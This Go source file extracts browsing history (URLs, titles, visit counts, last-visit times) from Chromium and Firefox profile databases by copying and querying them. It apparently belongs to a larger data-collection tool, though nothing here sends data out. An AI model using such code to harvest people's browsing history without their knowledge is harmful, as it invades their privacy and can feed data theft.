package browsers

import (
	"database/sql"
	"os"
	"path/filepath"

	"github.com/hackirby/skuld/utils/fileutil"
	_ "modernc.org/sqlite"
)

func (c *Chromium) GetHistory(path string) (history []History, err error) {
	tempPath := filepath.Join(os.TempDir(), "history_db")
	err = fileutil.CopyFile(filepath.Join(path, "History"), tempPath)
	if err != nil {
		return nil, err
	}

	db, err := sql.Open("sqlite", tempPath)
	if err != nil {
		return nil, err
	}

	defer os.Remove(tempPath)
	defer db.Close()

	rows, err := db.Query("SELECT url, title, visit_count, last_visit_time FROM urls")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		var (
			url, title      string
			visit_count     int
			last_visit_time int64
		)
		if err = rows.Scan(&url, &title, &visit_count, &last_visit_time); err != nil {
			continue
		}

		if url == "" || title == "" {
			continue
		}

		history = append(history, History{
			URL:           url,
			Title:         title,
			VisitCount:    visit_count,
			LastVisitTime: last_visit_time,
		})

	}

	return history, nil
}

func (g *Gecko) GetHistory(path string) (history []History, err error) {
	tempPath := filepath.Join(os.TempDir(), "history_db")
	err = fileutil.CopyFile(filepath.Join(path, "places.sqlite"), tempPath)
	if err != nil {
		return nil, err
	}

	db, err := sql.Open("sqlite", tempPath)
	if err != nil {
		return nil, err
	}

	defer os.Remove(tempPath)
	defer db.Close()

	rows, err := db.Query("SELECT url, title, visit_count, last_visit_date FROM moz_places")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		var (
			url, title      string
			visit_count     int
			last_visit_time int64
		)
		if err = rows.Scan(&url, &title, &visit_count, &last_visit_time); err != nil {
			continue
		}

		if url == "" || title == "" {
			continue
		}

		history = append(history, History{
			URL:           url,
			Title:         title,
			VisitCount:    visit_count,
			LastVisitTime: last_visit_time,
		})

	}

	return history, nil
}
